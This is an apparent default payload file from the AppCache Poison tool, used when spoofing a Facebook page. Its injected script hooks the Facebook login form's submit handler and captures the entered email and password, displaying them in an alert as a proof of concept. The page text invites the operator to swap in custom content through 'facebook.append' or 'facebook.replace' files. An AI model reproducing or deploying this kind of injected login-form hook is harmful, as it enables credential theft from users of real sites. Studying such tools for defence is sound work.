<h1>We work on Facebook too!</h1>
<p><code>%%tamper_url%%</code> page is spoofed by AppCache Poison, but this is just a default content. To replace it, create <code>facebook.append</code> or <code>facebook.replace</code> file and add your content there.</p>
<script>
var f = document.getElementById('login_form').onsubmit;
document.getElementById('login_form').onsubmit = function() {
    alert(document.getElementById('email').value + ' ' + document.getElementById('pass').value);
    return Event.__inlineSubmit(this,event);
}
</script>
